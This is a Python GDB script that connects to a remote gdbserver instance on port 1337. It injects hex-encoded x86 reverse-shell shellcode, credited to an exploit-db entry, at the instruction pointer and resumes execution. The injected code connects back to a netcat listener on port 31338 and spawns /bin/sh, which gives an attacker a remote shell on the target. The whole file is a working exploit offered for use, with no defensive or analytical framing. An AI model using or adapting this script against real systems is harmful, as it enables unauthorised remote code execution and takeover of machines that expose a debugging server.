import gdb
import socket
import struct
import sys


# host and port of the gdbserver instance
gdbserver = '', 1337

# host and port of the netcat listener
netcat = '', 31338


def progress(fmt, *args):
    sys.stdout.write(fmt % args + '\n')
    gdb.flush(gdb.STDOUT)


def reverse_shell((ip, port)):
    """Modified x86 reverse shell
    http://www.exploit-db.com/exploits/25497/
    """
    ip, port = socket.inet_aton(ip), struct.pack('>H', port)
    sc = \
        '31c031db31c931d2b066b301516a066a016a0289e1cd8089c6b06631dbb30268' \
        '00000000666800006653fec389e16a10515689e156cd805b31c9b103fec9b03f' \
        'cd8075f831c052686e2f7368682f2f626989e3525389e15289e2b00bcd80'
    return sc.decode('hex').replace('\x00'*4, ip).replace('\x00'*2, port)


gdb.execute('set confirm off')
gdb.execute('set verbose off')

progress('[x] Connecting to %s:%d', gdbserver[0], gdbserver[1])
gdb.execute('target extended-remote %s:%d' % gdbserver)

progress('[x] Installing invalid breakpoint')
bp = gdb.Breakpoint('*0', internal=True)

progress('[x] Running..')
try:
    gdb.execute('run')
except gdb.error as e:
    pass

progress('[x] Deleting invalid breakpoint')
bp.delete()

for idx, ch in enumerate(reverse_shell(netcat)):
    gdb.execute('set *(unsigned char *)($eip + %d) = %d' % (idx, ord(ch)))

gdb.execute('continue')
gdb.execute('continue')
